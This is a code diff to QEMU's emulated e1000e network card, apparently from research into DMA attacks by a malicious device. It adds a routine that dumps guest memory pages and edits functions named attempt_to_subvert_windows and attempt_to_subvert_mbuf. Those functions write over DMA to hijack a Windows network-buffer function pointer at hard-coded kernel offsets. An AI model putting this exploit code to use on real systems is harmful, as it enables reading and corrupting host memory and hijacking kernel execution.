@@ -2641,7 +2641,7 @@ set_tdt(E1000ECore *core, int index, uint32_t val)
     core->mac[index] = val & 0xffff;
 
 	PDBG("Sending from ring: %d", _e1000e_mq_queue_idx(TDT, index));
-	print_tx_buffer_address_information(core);
+	/*print_tx_buffer_address_information(core);*/
 
     _e1000e_tx_ring_init(core, &txr, _e1000e_mq_queue_idx(TDT, index));
     start_xmit(core, &txr);
@@ -3786,9 +3786,54 @@ attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
 	pci_dma_write(core->owner, ba & ~0xFF, buffer, 256);
 }
 
+static inline hwaddr
+page_addr(hwaddr addr)
+{
+	return addr & ~((1LL << 12) - 1);
+}
+
+void
+print_page(E1000ECore* core, hwaddr ba)
+{
+	const int ROW_SIZE = 16;
+	hwaddr print_addr, page_base, page_limit;
+	page_base = page_addr(ba);
+	page_limit = page_addr(ba + 4096);
+	printf("Printing page containg addr 0x%lx (0x%lx -> 0x%lx).\n", ba,
+		page_base, page_limit);
+	uint8_t buffer[ROW_SIZE];
+
+	for (print_addr = page_base; print_addr < page_limit;
+		print_addr += ROW_SIZE)
+	{
+		pci_dma_read(core->owner, print_addr, &buffer, ROW_SIZE);
+
+		printf("0x%0lx   ", print_addr);
+
+		for (int i = 0; i < ROW_SIZE; ++i) {
+			printf("%02x ", buffer[i]);
+
+			if (((i + 1) % 4) == 0) {
+				putchar(' ');
+			}
+			if (((i + 1) % 8) == 0) {
+				putchar(' ');
+			}
+		}
+
+		putchar('\n');
+
+		for (int j = 0; j < 1024; ++j) {
+			asm("nop");
+		}
+	}
+}
+
 void
 attempt_to_subvert_windows(E1000ECore* core, hwaddr ba)
 {
+	print_page(core, ba);
+	return;
 	/* Emprically detirmined by atm26:
 	 * - NET_BUFFER_LIST at ffffb08618300030
 	 * - function pointer at +0x50
@@ -3799,14 +3844,14 @@ attempt_to_subvert_windows(E1000ECore* core, hwaddr ba)
 	 * 0xffffb08618300030
 	 * 0xffffb08618300270
 	 */
-	static const hwaddr NET_BUFFER_LIST_OFFSET =
+	const hwaddr NET_BUFFER_LIST_OFFSET =
 		0xffffb08618300270LL - 0xffffb08618300030LL;
-	static const hwaddr SIGNATURE_OFFSET = 0xa0;
-	static const uint64_t EXPECTED_SIGNATURE = 0x422005b4;
-	static const uint64_t FP_OFFSET = 0x50;
-	static const uint64_t EXPECTED_SEND_FP = -1;
-	static const uint64_t WINDOWS_PAGE_MASK = (1LL << 13) - 1;
-	static const uint64_t NEW_FP_BASE = -1;
+	const hwaddr SIGNATURE_OFFSET = 0xa0;
+	const uint64_t EXPECTED_SIGNATURE = 0x422005b4;
+	const uint64_t FP_OFFSET = 0x50;
+	const uint64_t EXPECTED_SEND_FP = -1;
+	const uint64_t WINDOWS_PAGE_MASK = (1LL << 13) - 1;
+	const uint64_t NEW_FP_BASE = -1;
 
 	hwaddr net_buffer_list_addr = ba - NET_BUFFER_LIST_OFFSET;
 	hwaddr signature_addr = net_buffer_list_addr + SIGNATURE_OFFSET;
